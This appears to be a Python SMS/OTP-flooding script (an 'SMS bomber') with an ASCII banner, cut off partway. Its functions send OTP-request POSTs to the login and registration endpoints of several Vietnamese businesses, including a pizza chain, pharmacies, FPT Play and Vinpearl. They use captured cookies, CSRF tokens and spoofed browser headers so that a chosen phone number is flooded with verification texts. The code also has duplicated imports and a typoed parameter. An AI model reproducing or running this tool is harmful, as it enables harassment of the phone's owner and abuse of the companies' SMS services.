import os
from datetime import datetime
from colorama import Fore, init

# Initialize colorama for colored terminal output
init()

banner = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════╗
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██████╗░██╗░░░██╗░█████╗░░██████╗██╗░░██╗           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██╔══██╗██║░░░██║██╔══██╗██╔════╝██║░░██║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██████╦╝██║░░░██║███████║╚█████╗░███████║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██╔══██╗██║░░░██║██╔══██║░╚═══██╗██╔══██║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██████╦╝╚██████╔╝██║░░██║██████╔╝██║░░██║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝           {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║             
{Fore.YELLOW}║  {Fore.WHITE}          ░█████╗░███╗░░██╗░██████╗░                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ██╔══██╗████╗░██║██╔════╝░                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ███████║██╔██╗██║██║░░██╗░                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ██╔══██║██║╚████║██║░░╚██╗                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ██║░░██║██║░╚███║╚██████╔╝                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░                {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║              {Fore.YELLOW}Ngày: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}               {Fore.YELLOW}║
{Fore.YELLOW}╚══════════════════════════════════════════════════════╝
"""    
os.system('cls' if os.name== 'nt' else 'clear')
print(banner)
import os
import requests,os,time,re,json,uuid,random,sys
import concurrent.futures 
from concurrent.futures import ThreadPoolExecutor
from datetime import date
from time import sleep,strftime
from pystyle import *
from time import sleep 
import requests, random
import requests
import base64, json,os
from time import sleep,strftime
import re,requests,os,sys
from time import sleep 
import requests, random
import uuid, re
from pystyle import Write,Colors
import socket
from datetime import datetime
from pystyle import Colors, Colorate
import json,requests,time
from time import strftime
os.system('cls' if os.name == 'nt' else 'clear')
def print_banner():
    # màu
    RED = '\033[91m'
    GREEN = '\033[92m' 
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'  
    
    banner = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════╗
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██████╗░██╗░░░██╗░█████╗░░██████╗██╗░░██╗           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██╔══██╗██║░░░██║██╔══██╗██╔════╝██║░░██║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██████╦╝██║░░░██║███████║╚█████╗░███████║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██╔══██╗██║░░░██║██╔══██║░╚═══██╗██╔══██║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}██████╦╝╚██████╔╝██║░░██║██████╔╝██║░░██║           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝           {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║             
{Fore.YELLOW}║  {Fore.WHITE}          ░█████╗░███╗░░██╗░██████╗░                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ██╔══██╗████╗░██║██╔════╝░                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ███████║██╔██╗██║██║░░██╗░                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ██╔══██║██║╚████║██║░░╚██╗                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ██║░░██║██║░╚███║╚██████╔╝                {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.WHITE}          ╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░                {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║                                                      {Fore.YELLOW}║
{Fore.YELLOW}║              {Fore.YELLOW}Ngày: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}               {Fore.YELLOW}║
{Fore.YELLOW}╚══════════════════════════════════════════════════════╝
"""    
os.system('cls' if os.name== 'nt' else 'clear')
print(banner)
print_banner()
def pizza(phone):
   cookies = {
    '_gcl_au': '1.1.637043979.1723269122',
    '_gid': 'GA1.2.850945508.1723269122',
    '_fbp': 'fb.1.1723269122014.876709375172032518',
    '_tt_enable_cookie': '1',
    '_ttp': 'yvdUSZW1FhGPp0WInV0wJe1rO_Y',
    '.Nop.Antiforgery': 'CfDJ8BZF5ThCV2VIt0xp0xKrEonwqLIuIQI_vn0gC9Sn3pdcitBfmsEFfvVneZ4ZxEII9c6W2NHFcuV-Hzr1Hc_Ixh50sQY_77vIAQYb7gT9-f3ll607cqpRi8IojzoRmky3horKgGq5xtP5euU3w-DRGrM',
    '.Nop.Customer': 'a60cd9da-719f-46d7-91c5-21ef65a7e00d',
    '.Nop.TempData': 'CfDJ8BZF5ThCV2VIt0xp0xKrEonGO6ayneR0pptEu7v54FWPlpzKNwVkhNmisk1VgA1Z5_V32nzewVpvWDbTCAvYPWCU_8sXaUC0_5XpgtQKR6dSicFU6CPqT8_DJ5ajBL_c1hW9t9t1ZmYEBbM9nHeAVpfSWNkRecguE9H-4YfxdcIvixnWj95kO9gzAJ20jkIqwQ',
    '_ga': 'GA1.2.109960598.1723269122',
    '_ga_ZN2XYBNP5S': 'GS1.1.1723269121.1.1.1723269224.25.0.0',
}

   headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.637043979.1723269122; _gid=GA1.2.850945508.1723269122; _fbp=fb.1.1723269122014.876709375172032518; _tt_enable_cookie=1; _ttp=yvdUSZW1FhGPp0WInV0wJe1rO_Y; .Nop.Antiforgery=CfDJ8BZF5ThCV2VIt0xp0xKrEonwqLIuIQI_vn0gC9Sn3pdcitBfmsEFfvVneZ4ZxEII9c6W2NHFcuV-Hzr1Hc_Ixh50sQY_77vIAQYb7gT9-f3ll607cqpRi8IojzoRmky3horKgGq5xtP5euU3w-DRGrM; .Nop.Customer=a60cd9da-719f-46d7-91c5-21ef65a7e00d; .Nop.TempData=CfDJ8BZF5ThCV2VIt0xp0xKrEonGO6ayneR0pptEu7v54FWPlpzKNwVkhNmisk1VgA1Z5_V32nzewVpvWDbTCAvYPWCU_8sXaUC0_5XpgtQKR6dSicFU6CPqT8_DJ5ajBL_c1hW9t9t1ZmYEBbM9nHeAVpfSWNkRecguE9H-4YfxdcIvixnWj95kO9gzAJ20jkIqwQ; _ga=GA1.2.109960598.1723269122; _ga_ZN2XYBNP5S=GS1.1.1723269121.1.1.1723269224.25.0.0',
    'Origin': 'https://thepizzacompany.vn',
    'Referer': 'https://thepizzacompany.vn/Otp',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   data = {
    'phone': phone,
    '__RequestVerificationToken': 'CfDJ8BZF5ThCV2VIt0xp0xKrEolDNxiBPSE48b7TNxaa7HVeKioGsNOfJcuFiktW2svL_082dkVyABrhETaYZwSD8C_xRpaat8qQ_1393ZNof83VH1c_Icp87RecpfkBEiHOcFWsMOJsR2P5fCBuxIEP3xI',
}
   response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
def eco(phone):
   cookies = {
    'auth.strategy': 'local',
    '_gcl_au': '1.1.1008279718.1723262677',
    '_gid': 'GA1.3.796370172.1723262678',
    '_gac_UA-89533981-2': '1.1723262707.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_ga_K3DCRYGN3N': 'GS1.3.1723262707.1.0.1723262707.0.0.0',
    '_gcl_aw': 'GCL.1723268940.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_ga_G9P9P58D5Y': 'GS1.1.1723268939.2.0.1723268939.60.0.0',
    '_gat_UA-89533981-1': '1',
    '_ga': 'GA1.3.1563520536.1723262678',
    '_dc_gtm_UA-91935928-1': '1',
    '__uidac': '0166b6ff4ba30aef0b9895bdf6812185',
    '__adm_upl': 'eyJ0aW1lIjoxNzIzMjY4OTQ0LCJfdXBsIjpudWxsfQ==',
    'dtdz': '4244a287-04b9-5808-a6a3-c3792429ebbb',
    '__iid': '',
    '__iid': '',
    '__su': '0',
    '__su': '0',
    '_fbp': 'fb.2.1723268940190.206556528840159017',
    '_gac_UA-89533981-1': '1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_gac_UA-91935928-1': '1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    '_gat_UA-91935928-1': '1',
    '_ga_GEFZP21KYF': 'GS1.3.1723268939.2.0.1723268941.58.0.0',
    '_ga_F8EJ8FPVHZ': 'GS1.1.1723268939.2.0.1723268948.51.0.0',
}

   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'auth.strategy=local; _gcl_au=1.1.1008279718.1723262677; _gid=GA1.3.796370172.1723262678; _gac_UA-89533981-2=1.1723262707.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _ga_K3DCRYGN3N=GS1.3.1723262707.1.0.1723262707.0.0.0; _gcl_aw=GCL.1723268940.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _ga_G9P9P58D5Y=GS1.1.1723268939.2.0.1723268939.60.0.0; _gat_UA-89533981-1=1; _ga=GA1.3.1563520536.1723262678; _dc_gtm_UA-91935928-1=1; __uidac=0166b6ff4ba30aef0b9895bdf6812185; __adm_upl=eyJ0aW1lIjoxNzIzMjY4OTQ0LCJfdXBsIjpudWxsfQ==; dtdz=4244a287-04b9-5808-a6a3-c3792429ebbb; __iid=; __iid=; __su=0; __su=0; _fbp=fb.2.1723268940190.206556528840159017; _gac_UA-89533981-1=1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _gac_UA-91935928-1=1.1723268942.CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE; _gat_UA-91935928-1=1; _ga_GEFZP21KYF=GS1.3.1723268939.2.0.1723268941.58.0.0; _ga_F8EJ8FPVHZ=GS1.1.1723268939.2.0.1723268948.51.0.0',
    'csrf-secret': 'bRLY11A79M7jv6Nm5QUktZB5',
    'csrf-token': '6mKzYXmf-pCdEjf1DW4FwS0d0sIjIEQxCfHzKR3SKYc-WbO5zYhQ',
    'origin': 'https://ecogreen.com.vn',
    'priority': 'u=1, i',
    'referer': 'https://ecogreen.com.vn/?gclid=CjwKCAjw_Na1BhAlEiwAM-dm7OwOgscfzbCZyuBItWlNDehAdEuZ5EhNaQI4T1PtwEmW3whugq_kShoCRhAQAvD_BwE',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://ecogreen.com.vn/api/auth/register/send-otp', cookies=cookies, headers=headers, json=json_data)
def mego(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.medigoapp.com',
    'priority': 'u=1, i',
    'referer': 'https://www.medigoapp.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
def fptplay(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json; charset=UTF-8',
    'origin': 'https://fptplay.vn',
    'priority': 'u=1, i',
    'referer': 'https://fptplay.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-did': 'CB10CE01EA13622F',
}

   json_data = {
    'phone': phone,
    'country_code': 'VN',
    'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
}

   response = requests.post(
    'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=pp8g343UZxj9g1vgy-gcOA&e=1723271548&device=Chrome(version%253A127.0.0.0)&drm=1',
    headers=headers,
    json=json_data,
)
def vinpearl(phone):
   headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'access-control-allow-headers': 'Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
    'authorization': 'Bearer undefined',
    'content-type': 'application/json',
    'origin': 'https://booking.vinpearl.com',
    'priority': 'u=1, i',
    'referer': 'https://booking.vinpearl.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-display-currency': 'VND',
}

   json_data = {
    'channel': 'vpt',
    'username': phone,
    'type': 1,
    'OtpChannel': 1,
}

   response = requests.post(
    'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
    headers=headers,
    json=json_data,
)
def rich(phone):
   cookies = {
    'PHPSESSID': '04b9dr3ghrfef6vrks06v8bb02',
    'form_key': 'z4LNRXM23ah8smI1',
    'mage-cache-storage': '%7B%7D',
    'mage-cache-storage-section-invalidation': '%7B%7D',
    'mage-cache-sessid': 'true',
    '_gid': 'GA1.3.1961939476.1723173538',
    '_gat': '1',
    'form_key': 'z4LNRXM23ah8smI1',
    'mage-messages': '',
    'recently_viewed_product': '%7B%7D',
    'recently_viewed_product_previous': '%7B%7D',
    'recently_compared_product': '%7B%7D',
    'recently_compared_product_previous': '%7B%7D',
    'product_data_storage': '%7B%7D',
    'mgn_location_popup': 'hcmc',
    'X-Magento-Vary': '5af667c6bab2aa610dedd1a1b31a2bc973082a33',
    '_ga_ERJHC2DBNR': 'GS1.1.1723173536.1.1.1723173543.53.0.0',
    '_ga_YJCKSVZ38K': 'GS1.1.1723173536.1.1.1723173543.0.0.0',
    '_ga': 'GA1.3.1436578517.1723173537',
    'private_content_version': '1d584b89ea88d4dfef0817d1182d49bd',
    'section_data_ids': '%7B%7D',
}

   headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=04b9dr3ghrfef6vrks06v8bb02; form_key=z4LNRXM23ah8smI1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; _gid=GA1.3.1961939476.1723173538; _gat=1; form_key=z4LNRXM23ah8smI1; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mgn_location_popup=hcmc; X-Magento-Vary=5af667c6bab2aa610dedd1a1b31a2bc973082a33; _ga_ERJHC2DBNR=GS1.1.1723173536.1.1.1723173543.53.0.0; _ga_YJCKSVZ38K=GS1.1.1723173536.1.1.1723173543.0.0.0; _ga=GA1.3.1436578517.1723173537; private_content_version=1d584b89ea88d4dfef0817d1182d49bd; section_data_ids=%7B%7D',
    'Origin': 'https://shop.richs.com.vn',
    'Referer': 'https://shop.richs.com.vn/customer/account/create/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   data = {
    'phone_number': phone,
}

   response = requests.post('https://shop.richs.com.vn/phone/account/phonecode/', cookies=cookies, headers=headers, data=data)
def pico(ohone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'access': '206f5b6838b4e357e98bf68dbb8cdea5',
    'channel': 'b2c',
    'content-type': 'application/json',
    'origin': 'https://pico.vn',
    'party': 'ecom',
    'platform': 'Desktop',
    'priority': 'u=1, i',
    'referer': 'https://pico.vn/',
    'region-code': 'MB',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'uuid': '159516baf10d4c5ab3ec9d62dc214b1b',
}

   json_data = {
    'phone': phone,
}

   response = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers, json=json_data)

def lie(phone):
   cookies = {
    'form_key': 'uA6kOmKlagg4bbHj',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'mage-messages': '',
    'PHPSESSID': '7b3d13efa2773b86d84fe7dc9a07215f',
    '_gcl_au': '1.1.1175078766.1723172173',
    '_gid': 'GA1.3.697666992.1723172173',
    '_gac_UA-10523984-2': '1.1723172173.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE',
    '_tt_enable_cookie': '1',
    '_ttp': 'hDUvt0RTxPPEwT1WPlQDLBvBhyK',
    '_gcl_aw': 'GCL.1723172212.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE',
    '_gcl_gs': '2.1.k1$i1723172211',
    '_ga_EG96D1Q288': 'GS1.1.1723172173.1.1.1723172212.21.0.0',
    '_ga': 'GA1.3.1993177176.1723172173',
    'form_key': 'uA6kOmKlagg4bbHj',
    'section_data_ids': '{}',
}

   headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    # 'cookie': 'form_key=uA6kOmKlagg4bbHj; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; PHPSESSID=7b3d13efa2773b86d84fe7dc9a07215f; _gcl_au=1.1.1175078766.1723172173; _gid=GA1.3.697666992.1723172173; _gac_UA-10523984-2=1.1723172173.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE; _tt_enable_cookie=1; _ttp=hDUvt0RTxPPEwT1WPlQDLBvBhyK; _gcl_aw=GCL.1723172212.CjwKCAjw2dG1BhB4EiwA998cqBIppNezxIIdGSW5ExcxYfjuEcUXbfGNDAF1X3zsYN8vfJgdy1DAphoCpS0QAvD_BwE; _gcl_gs=2.1.k1$i1723172211; _ga_EG96D1Q288=GS1.1.1723172173.1.1.1723172212.21.0.0; _ga=GA1.3.1993177176.1723172173; form_key=uA6kOmKlagg4bbHj; section_data_ids={}',
    'origin': 'https://www.liena.com.vn',
    'priority': 'u=1, i',
    'referer': 'https://www.liena.com.vn/la-customer/register',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   json_data = {
    'phone_number': phone,
}

   response = requests.post(
    'https://www.liena.com.vn/rest/V1/liena/customer/registration/request',
   cookies=cookies,
   headers=headers,
   json=json_data,
)
def aji(phone):
   headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://dinhduongmevabe.com.vn',
    'Referer': 'https://dinhduongmevabe.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

   params = {
    'userName': phone,
}

   response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/GetVerifyPhoneNumberCode', params=params, headers=headers)
def mio(phone):
   cookies = {
    '_utm_src': 'google_search',
    '_utm_campaign': 'HCM_popular',
    '_utm_medium': 'cpc',
    '_utm_term': 'self_driver',
    '_vid': 'anoO0APTDZu8Yhkx',
    '_hv': 'b4e1bf5ad13d34ecdf89aded893c1b5219e6ab04111886a36a257b9632f269b3',
    '_gcl_aw': 'GCL.1723171407.CjwKCAjw2dG1BhB4EiwA998cqKh3JDZhh42ikVLAa_y4HnBwbMiPfsrA2ZyWVD56curTIKXQifWB9RoC5e4QAvD_BwE',
    '_gcl_gs': '2.1.k1$i1723171406',
    '_gcl_au': '1.1.1342151403.1723171407',
    '_ga': 'GA1.1.1689852820.1723171407',
    '_hs': '581f2d6c98ddfd2a4e4f6b00c4e801f4d1f12a04624cedf7179d254b71b9aafb',
    '_ga_69J768NCYT': 'GS1.1.1723171407.1.1.1723171493.60.0.0',
    '_ga_ZYXJJRHCTB': 'GS1.1.1723171407.1.1.1723171493.0.0.0',
}

   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    # 'content-length': '0',
    # 'cookie': '_utm_src=google_search; _utm_campaign=HCM_popular; _utm_medium=cpc; _utm_term=self_driver; _vid=anoO0APTDZu8Yhkx; _hv=b4e1bf5ad13d34ecdf89aded893c1b5219e6ab04111886a36a257b9632f269b3; _gcl_aw=GCL.1723171407.CjwKCAjw2dG1BhB4EiwA998cqKh3JDZhh42ikVLAa_y4HnBwbMiPfsrA2ZyWVD56curTIKXQifWB9RoC5e4QAvD_BwE; _gcl_gs=2.1.k1$i1723171406; _gcl_au=1.1.1342151403.1723171407; _ga=GA1.1.1689852820.1723171407; _hs=581f2d6c98ddfd2a4e4f6b00c4e801f4d1f12a04624cedf7179d254b71b9aafb; _ga_69J768NCYT=GS1.1.1723171407.1.1.1723171493.60.0.0; _ga_ZYXJJRHCTB=GS1.1.1723171407.1.1.1723171493.0.0.0',
    'origin': 'https://www.mioto.vn',
    'priority': 'u=1, i',
    'referer': 'https://www.mioto.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   params = {
    'phone': phone,
    'action': '2',
    'otpBy': '0',
}

   response = requests.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, cookies=cookies, headers=headers)
def bds(phone):
   cookies = {
    '_gid': 'GA1.2.1983671431.1723171050',
    '_gat_gtag_UA_61644228_3': '1',
    'app_version': 'eyJpdiI6ImJ5TXV5bzVaeXVvbUwxSGZCcHpoZGc9PSIsInZhbHVlIjoiQ0lERnFYWjUvUS9kL1owdmQ0QStkZUZaQ1JmK015d3dUTGhYT2F6N0V2RWhNbERrZVgzMSs4SG9ya1ZxVWRRbyIsIm1hYyI6IjMyMDBlZjJhY2UyZDU5ZDc4ZWE1ZjVjNWYzMjI5NDA0NDM0YjE4Y2NjZDA0ZjgwYzAzNTU3NTkzOTlmODQzMDciLCJ0YWciOiIifQ%3D%3D',
    '_ga': 'GA1.1.2086274722.1723171050',
    'TawkConnectionTime': '0',
    'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUqAQHvuSb8GNaaYRM53jL4WkeTMqbYYbTBxSTzTB4pHItLNYzr8mn8fQ5IYq6ZklVdcbVnj6o0wwBXrjwcsMEseCC3CgEqjpLpktzwtrnvrurG2G%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723171052785%7D',
